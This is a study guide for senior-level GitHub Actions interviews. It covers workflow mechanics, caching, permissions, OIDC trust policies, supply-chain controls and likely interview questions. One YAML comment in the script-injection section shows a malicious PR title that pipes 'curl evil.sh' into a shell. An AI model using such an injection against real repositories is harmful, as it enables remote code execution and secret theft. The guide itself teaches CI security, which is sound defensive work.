One continuous review of the whole subject, organised by topic rather than by level — foundations, pipeline machinery, and the security and platform work a senior is accountable for. Roughly forty minutes. Common questions are at the end.

## The model, and the fundamentals in one screen

<div class="flow">
  <div class="node">EVENT<small>push / PR / cron</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">WORKFLOW<small>one YAML file</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">JOB<small>one fresh machine</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">STEP<small>run or uses</small></div>
</div>

**One workflow, many jobs, each job many steps, each job its own machine.** Mandatory keys: `on`, `jobs`, and per job `runs-on` and `steps`. Steps share a filesystem and run in order; jobs share nothing and run in parallel unless ordered by `needs`.

| Trap | Cause | Fix |
|---|---|---|
| "No such file" for a repo file | Runner starts empty | `actions/checkout@v4` |
| Deploy cannot find `dist/` | Different machine | Artifact upload + download |
| `cd` has no effect next step | New shell per step | `working-directory:` |
| Variable empty next step | `export` dies with the step | `>> "$GITHUB_ENV"` |
| Condition never matches | `github.ref` is `refs/heads/main` | Compare the full ref |
| `python-version: 3.10` → 3.1 | YAML numeric | Quote versions |

## Data flow

<div class="flow">
  <div class="node">$GITHUB_ENV<small>later steps</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">$GITHUB_OUTPUT<small>step outputs</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">job outputs<small>strings across jobs</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">artifacts<small>files across jobs</small></div>
</div>

```yaml
- id: meta
  run: |
    echo "TAG=sha-${GITHUB_SHA::7}" >> "$GITHUB_ENV"
    echo "tag=sha-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"
    echo "| coverage | 91% |"       >> "$GITHUB_STEP_SUMMARY"
```

`$GITHUB_ENV` is not readable in the step that wrote it, and nothing here crosses a job boundary. **Outputs for strings, artifacts for files.** Job outputs are not secret and are size-limited.

`outcome` versus `conclusion`: `outcome` is the raw step result, `conclusion` is after `continue-on-error`. A tolerated failure is `failure` / `success`.

## Caching, artifacts, matrices, services

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements*.txt') }}
    restore-keys: ${{ runner.os }}-pip-
```

`key` is exact and a hit skips the save; `restore-keys` are prefixes for a partial hit; entries are **immutable**; scope follows the branch graph; `cache-hit` is `'true'` only on an exact match. A volatile key never hits, a fixed key never invalidates.

*A cache is an optimisation you must be able to lose; an artifact is data you cannot.* On uploads: `if: always()`, unique name per matrix cell, short `retention-days`, `if-no-files-found: error`.

Matrix axes multiply, then `exclude` removes and `include` adds. `fail-fast: true` is the default; `max-parallel` protects a shared resource; ceiling is 256 jobs per run; the generated job name embeds the combination, so adding an axis renames a required check. Dynamic matrices come from `fromJSON(needs.discover.outputs.list)`.

Service containers need a **health check** — its absence is the whole explanation for "fails on the first run, passes on the re-run". Hostname is `localhost` from the runner, the service name from inside a `container:`.

## Reuse, environments, concurrency

<div class="guide-compare">
  <div class="guide-compare-col good">
    <h4>Reusable workflow — job level</h4>
    <ul>
      <li><code>on: workflow_call</code>, typed <code>inputs</code>, explicit <code>secrets</code>, <code>outputs</code></li>
      <li>Own jobs, runners, <code>permissions</code></li>
      <li>Receives the caller's token and cannot exceed it</li>
    </ul>
  </div>
  <div class="guide-compare-col bad">
    <h4>Composite action — step level</h4>
    <ul>
      <li>Runs in the caller's job on the caller's runner</li>
      <li>No jobs, no matrices, no own runner</li>
      <li><code>shell:</code> mandatory on every <code>run</code></li>
    </ul>
  </div>
</div>

```yaml
# CI: one run per branch, cancel superseded
concurrency: { group: '${{ github.workflow }}-${{ github.ref }}', cancel-in-progress: true }

# CD: one deploy at a time, QUEUE rather than cancel
concurrency: { group: deploy-production, cancel-in-progress: false }
```

An **environment** gives scoped secrets and variables, required reviewers, wait timers, branch restrictions, and a deployment record. A **required check skipped by a path filter** leaves a PR waiting forever — fix with a same-named stub workflow.

## The trust model

This is the axis most candidates are weakest on, and the one carrying real risk. Three properties decide your exposure: **whose code runs**, **whether secrets are present**, **what the token can do**.

| Trigger | Runs code from | Secrets | Token |
|---|---|---|---|
| `push`, same-repo `pull_request` | Your repository | Yes | As configured |
| `pull_request` from a **fork** | The fork | **No** | Read-only |
| `pull_request_target` | The base repository | **Yes** | Write-capable |
| `workflow_run`, `issue_comment` | The base repository | Yes | Write-capable |

<div class="callout warn">
  <span class="ct">The most dangerous pattern in GitHub Actions</span>
  <code>pull_request_target</code> plus checking out <code>github.event.pull_request.head.sha</code> runs <b>untrusted fork code</b> in a job holding <b>your secrets and a writable token</b>. Any build script in the fork can print every secret. Safe shapes: never check out the head ref, or split it — an unprivileged <code>pull_request</code> job produces an artifact that a separate <code>workflow_run</code> job consumes without executing fork code.
</div>

### Script injection

```yaml
# Vulnerable — a PR titled  "; curl evil.sh | sh ;  runs on your runner
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe — the value arrives as data, never as shell source
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

The rule: **`${{ github.event.* }}` never appears inside a `run` body.** Titles, branch names, comment bodies, and author names are attacker-controlled.

## Permissions and identity

```yaml
permissions:
  contents: read            # a read-only floor for the workflow

jobs:
  release:
    permissions:
      contents: write       # widened for one job only
      packages: write
      id-token: write       # required for OIDC
```

Declaring **any** scope sets every undeclared scope to `none` — that is the whole mechanism. Set the organisation default to read-only and make workflows opt in. `GITHUB_TOKEN` is per job, repository-scoped, expires with the job, and **cannot reach another repository**; that needs a GitHub App installation token (scoped, short-lived, attributable) rather than a PAT (a human's full access, no job-bound expiry).

### OIDC

<div class="guide-timeline">
  <div class="guide-timeline-item"><span>1</span><strong>Job requests a token</strong><small>GitHub signs a short-lived JWT describing repository, ref, environment, workflow.</small></div>
  <div class="guide-timeline-item"><span>2</span><strong>Cloud verifies the signature</strong><small>GitHub's OIDC provider is a registered trusted identity provider.</small></div>
  <div class="guide-timeline-item"><span>3</span><strong>Trust policy checks the claims</strong><small>The part that matters, and the part usually misconfigured.</small></div>
  <div class="guide-timeline-item"><span>4</span><strong>Temporary credentials issued</strong><small>Valid for the job. Nothing stored, nothing to rotate, nothing to leak.</small></div>
</div>

```yaml
permissions: { id-token: write, contents: read }
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}
      aws-region: ${{ vars.AWS_REGION }}
```

<div class="callout warn">
  <span class="ct">Where OIDC is almost always wrong</span>
  A trust policy matching <code>repo:my-org/*:*</code> lets <b>any branch of any repository</b> assume the role — including a branch an attacker opens a PR from. Constrain the <code>sub</code> claim to <code>repo:my-org/my-repo:ref:refs/heads/main</code>, or better <code>…:environment:production</code>, so the approval gate is part of the identity. Then verify it by trying from a throwaway branch — it must be refused.
</div>

## Supply chain

| Control | Removes |
|---|---|
| Pin third-party actions to a full commit SHA | A moving tag repointed at malicious code |
| Dependabot on `github-actions` | Those pins going stale — pinning without updating is its own failure |
| Organisation policy: selected actions only | An unvetted action entering via any repository |
| Vendor critical actions | Dependence on an account you do not control |
| `contents: read` by default | A compromised step's ability to push |
| Environment protection on deploys | An automated path to production without review |

```yaml
- uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3  # v3.5.0
```

Two surfaces worth raising unprompted: **caches are writable by pull requests**, so never restore-and-execute without verification; and **self-hosted runners on public repositories** combine untrusted code with persistent state.

## Runners, cost, containers

| Situation | Choice |
|---|---|
| Ordinary CI | GitHub-hosted |
| CPU-bound private repo | Larger hosted runner |
| GPU, licence, VPC-only service | Self-hosted, **ephemeral**, repo-scoped, network-segmented |
| Public repo with fork PRs | Never self-hosted |
| Many repos, one custom image | Hosted runner with `container:` |

Windows bills at roughly twice Linux, macOS roughly ten times — a matrix that includes macOS "for completeness" can be most of the bill.

```yaml
- uses: docker/setup-buildx-action@v3
- uses: docker/build-push-action@v6
  with:
    push: ${{ github.event_name != 'pull_request' }}   # forks must not publish
    tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
    cache-from: type=gha
    cache-to: type=gha,mode=max                       # exports intermediate layers
    provenance: true
```

`mode=max` gives a far better hit rate on multi-stage builds; a registry cache when many repos or runners share layers. Immutable `:${{ github.sha }}` tags for deployment references. `linux/arm64` under emulation is slow — use native ARM runners.

## Custom actions

| Type | Runs as | For | Watch out |
|---|---|---|---|
| Composite | Steps in the caller's job | Repeated step sequences | `shell:` on every `run` |
| JavaScript | Node on the runner | Logic, API calls, cross-platform | Bundled `dist/` must be committed |
| Docker | A container on the runner | Any toolchain | Linux only, pull cost per job |

Publish `v1.2.3` and keep a moving `v1`.

## Platform, observability, ML

Standardise with reusable workflows in an organisation `.github` repository, CODEOWNERS on the workflow folder, a moving major tag, and a canary repository before moving it. Enforce with policy, not documentation, and make the compliant path the easy path — if upstream changes take two weeks, forking is rational and you will lose.

The four numbers that turn "CI is slow" from an opinion into a funded priority: **median and p95 duration per workflow · failure rate split into real failures and flakes · queue time · cost by workflow and runner label.**

For machine learning, **Actions is the orchestrator and audit trail, not the compute**: validate cheaply, submit to a platform built for training, gate on a **comparison against the deployed model** rather than a hard-coded threshold, publish metrics to the step summary, and promote from a separate job behind an environment.

```yaml
- name: Gate on a comparison with production, not an absolute
  run: |
    python -m pipeline.compare \
      --candidate "${{ needs.train.outputs.run-id }}" \
      --baseline production --min-delta 0.0
```

## The review checklist

| Check | Looking for |
|---|---|
| `on:` triggers | `pull_request_target`, `workflow_run`, `issue_comment` — each gives fork-influenced runs a privileged token |
| Checkout ref | `head.sha` under `pull_request_target` |
| `permissions` | Present, minimal, widened per job |
| Third-party `uses:` | SHA-pinned, recognisable, Dependabot-covered |
| Interpolation | No `${{ github.event.* }}` inside a `run` |
| Secrets | Never echoed, never in a job running untrusted code |
| `concurrency` / `timeout-minutes` | Present; cancelling on CI, queuing on deploys |
| Cache | Hashes a lockfile; nothing executable restored then run unverified |

## Common interview questions

<ol class="guide-steps">
  <li><b>Explain <code>pull_request</code> versus <code>pull_request_target</code>, and the pattern that makes the second dangerous.</b>Fork PRs under <code>pull_request</code> get no secrets and a read-only token — deliberately harmless. <code>pull_request_target</code> runs in the base repository's context with secrets and a writable token. Combined with checking out <code>head.sha</code> it executes untrusted fork code with full credentials, which is a straight secret-exfiltration path. Never check out the head ref there; split the work across <code>pull_request</code> and <code>workflow_run</code> if you need both.</li>
  <li><b>Write a <code>permissions</code> block for a workflow that publishes a package and deploys with OIDC, and justify every scope.</b><code>contents: read</code> at workflow level as a floor; on the publish job <code>packages: write</code> and <code>contents: write</code> only if it tags; on the deploy job <code>id-token: write</code> for OIDC plus <code>contents: read</code>. Declaring any scope zeroes the rest, which is the point.</li>
  <li><b>Describe a safe OIDC trust policy and one that looks fine but is not.</b>Safe: <code>sub</code> constrained to <code>repo:org/repo:environment:production</code>, so the environment's approval is part of the identity. Unsafe: <code>repo:org/*:*</code>, which any branch of any repository — including a fork PR branch — can satisfy. Verify by attempting the assume-role from a throwaway branch.</li>
  <li><b>A secret appeared in a public build log an hour ago.</b>Rotate first — assume it is already scraped. Then revoke the old credential, delete the log and the run, find the line that printed it, and close the class: secrets through <code>env</code> and never interpolated, plus OIDC so there is nothing to leak.</li>
  <li><b>Give three supply-chain controls, ordered by the risk they remove.</b>SHA-pin third-party actions (stops a tag being repointed at malicious code); default the token to <code>contents: read</code> (bounds what a compromised step can do); organisation allow-list plus Dependabot (stops unvetted actions entering, and stops pins going stale).</li>
  <li><b>Every deploy since Tuesday shipped the wrong build.</b>Look at the cache and artifact names before the code — a never-invalidating key, or two matrix cells uploading the same artifact name, both produce exactly this and neither appears in a diff. Then deploy by immutable SHA tag so "what is running" has an answer.</li>
  <li><b>CI is 30% flaky and people re-run until green.</b>Re-running destroys the signal CI exists to provide. Measure which jobs fail and how, then remove causes in order: missing service health checks, matrix cells sharing a fixture, unpinned external dependencies, timing assumptions. Quarantine what you cannot fix into a clearly named non-blocking job so the debt is visible rather than hidden.</li>
  <li><b>A third-party action you depend on was compromised.</b>Find every repository referencing it and at what ref, revoke every secret those workflows could reach — not just the ones you think were used — replace with a vetted SHA or an internal fork, then close the class with pinning, an allow-list, and Dependabot.</li>
  <li><b>How do you standardise CI across sixty repositories?</b>Reusable workflows in an organisation <code>.github</code> repository with CODEOWNERS; consumers pin a major tag that you move on release; canary one low-risk repository on the exact patch first; inputs treated as a public API with types, defaults, and descriptions; enforced by branch protection and an actions allow-list.</li>
  <li><b>Choose between composite, JavaScript, and Docker actions.</b>Composite for a repeated step sequence — but it cannot define jobs, matrices, or its own runner. JavaScript for real logic and identical behaviour across all three operating systems, at the cost of committing a bundled <code>dist/</code>. Docker for an arbitrary toolchain, at the cost of Linux-only and an image pull per job.</li>
  <li><b>What changes when the pipeline trains a model instead of building a binary?</b>Lint, tests, caching, environments, and OIDC carry over. New: data validation as a gate, metric thresholds that fail the job, comparison against the deployed model, lineage linking commit and dataset version to the artifact, and GPU or long-running compute. Architecturally, Actions orchestrates and records; it does not train — proposing a six-hour GPU job on a hosted runner reads as inexperience.</li>
  <li><b>How would you migrate from Jenkins?</b>Inventory the jobs; port leaf jobs first to prove runners, network access, and credentials with minimal risk; run both systems in parallel with Actions non-blocking; move required checks over one at a time as each earns trust; decommission. Do not port Jenkinsfile logic verbatim — much of it works around a persistent workspace that Actions does not have.</li>
  <li><b>Two merges deployed concurrently and one overwrote the other.</b>A <code>concurrency</code> group on the deploy job keyed on the environment with <code>cancel-in-progress: false</code> so releases queue rather than die mid-flight. Then make the deploy idempotent, because concurrency is a guard and not a correctness property.</li>
  <li><b>What do you look for reviewing a workflow pull request?</b>Walk the checklist above: triggers, checkout ref, permissions, third-party pinning, interpolation of event data, secret reachability, concurrency and timeouts, cache sanity, and whether a required check name changed.</li>
</ol>

## Final self-test

- Give the trust table from memory: which triggers grant secrets and a writable token.
- Name the exact `pull_request_target` exfiltration pattern and two safe alternatives.
- Explain why declaring one `permissions` scope is a security control.
- Describe a safe OIDC `sub` constraint.
- Give both ways a cache key can be wrong.
- Write a concurrency block for CI and one for CD, and justify the difference.
- Name the four numbers you would track to argue CI needs investment.
- Say what changes for an ML pipeline, and what Actions should *not* be doing.
